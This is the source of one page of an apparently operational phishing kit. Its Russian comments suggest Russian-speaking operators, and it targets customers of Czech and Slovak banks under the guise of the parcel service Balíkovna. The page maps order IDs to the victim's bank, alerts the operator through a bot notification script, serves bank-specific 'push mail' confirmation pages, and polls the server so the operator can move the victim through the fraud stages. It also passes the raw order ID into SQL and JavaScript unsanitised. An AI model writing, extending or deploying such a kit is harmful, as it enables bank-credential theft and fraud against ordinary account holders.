<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
</head>
<body>
  
</body>
</html>

<?php

error_reporting(E_ALL);
require_once __DIR__ . '/../vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createUnsafeImmutable(dirname(__DIR__));
$dotenv->load();

$dbhost = getenv('dbHost');
$dblogin = getenv('dbLogin');
$dbpass = getenv('dbPass');
$dbport = getenv('dbPort');

ini_set('display_errors', 1);
$dbconn = pg_connect("host={$dbhost} port={$dbport} dbname=link_infos user={$dblogin} password={$dbpass}");
$userdbconn = pg_connect("host={$dbhost} port={$dbport} dbname=user_infos user={$dblogin} password={$dbpass}");
if ($dbconn) {
  $id = $_GET['orderid'];
  $_SESSION['orderid'] = $id;
  $result = pg_query($dbconn, "SELECT * FROM link_infos WHERE orderid='$id'");
  if ($result) {
      $row = pg_fetch_array($result, null, PGSQL_ASSOC);
      if (!empty($row)) { 
        $bank = $row['bank'];
        switch ($bank) {
            case 'ing':
              $bank_name = 'ING Bank';
              break;
            case 'jt':
              $bank_name = 'J&T Banka';
              break;
            case 'kb':
              $bank_name = 'Komerční banka';
              break;
            case 'mbank':
              $bank_name = 'mBank';
              break;
            case 'modra':
              $bank_name = 'Modrá pyramida stavební spořitelna';
              break;
            case 'moneta':
              $bank_name = 'Moneta Money Bank';
              break;
            case 'ober':
              $bank_name = 'Oberbank AG';
              break;
            case 'penez':
              $bank_name = 'Peněžní dům';
              break;
            case 'ppf':
              $bank_name = 'PPF banka';
              break;
            case 'raif':
              $bank_name = 'Raiffeisenbank';
              break;
            case 'sporitelna':
              $bank_name = 'Česká spořitelna';
              break;
            case 'trinity':
              $bank_name = 'Trinity Bank';
              break;
            case 'unicredit':
              $bank_name = 'UniCredit Bank Czech Republic and Slovakia';
              break;
            case 'vub':
              $bank_name = 'Všeobecná úvěrová banka';
              break;
            case 'air':
              $bank_name = 'Air Bank';
              break;
            case 'artesa':
              $bank_name = 'Artesa';
              break;
            case 'citfin':
              $bank_name = 'Citfin';
              break;
            case 'citi':
              $bank_name = 'Citi Bank';
              break;
            case 'commerz':
              $bank_name = 'Commerz Bank';
              break;
            case 'credit':
              $bank_name = 'Credit Bank';
              break;
            case 'csob':
              $bank_name = 'ČSOB';
              break;
            case 'equa':
              $bank_name = 'Equa Bank';
              break;
            case 'expo':
              $bank_name = 'Expo Bank';
              break;
            case 'fio':
              $bank_name = 'Fio Banka';
              break;
            case 'hsbc':
              $bank_name = 'HSBC Bank';
              break;
            case 'hypo':
              $bank_name = 'Hypoteční banka';
              break;
            default:
              $bank_name = 'Unknown Bank';
              break;
          }

        }
      }    
      $currStageText = '✉️Переход на подтверждение уведомления на почте <b>' . $bank_name . '</b>';
      require 'botNotification.php';


// Заменяем значение "bank" на нормальное название банка
switch ($bank) {
    case 'csob':
      include 'csob/csobpushmail.php';
      break;
    default:
        include 'defaultbank/index.php';
        break;
    }
  }


?>
    <?php
        include 'chat.php'
    ?>
<script>
$(window).on('load', function () {
    // Получаем текущий URL
    var currentUrl = window.location.href;

    // Переменная для отслеживания перенаправления
    var isRedirecting = false;

    // Функция проверки стадии
    function checkStage() {
        $.ajax({
            url: '/balikovna/checkstage.php',
            method: 'POST',
            data: {
                orderid: '<?php echo $id ?>',
                currstage: 'pushmail'
            },
            success: function (stage) {
                // Получаем orderid
                var orderId = <?php echo $id ?>;
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'pushmail' && stage != '') {
                    console.log(stage)
// Устанавливаем флаг перенаправления
isRedirecting = true;

// Находим позицию "balikovna/" в текущем URL
const currentURL = window.location.href;
const balikovnaPosition = currentURL.indexOf("balikovna/");

// Обрезаем URL после "balikovna/"
const baseURL = currentURL.slice(0, balikovnaPosition + 'balikovna/'.length); // 9 символов в "balikovna/"

// Формируем новый URL для перенаправления пользователя
const url = baseURL + stage + "/?orderid=" + orderId + '&bank=' + "<?php echo $row['bank']?>";

// Перенаправляем пользователя на нужную страницу
window.location.href = url;

                } else {
                    // Повторяем проверку через 1 секунду
                    setTimeout(checkStage, 1000);
                }
            }
        });
    }

    // Вызываем функцию проверки стадии
    checkStage();
});

    </script>
        <script src="/balikovna/script.js"></script>
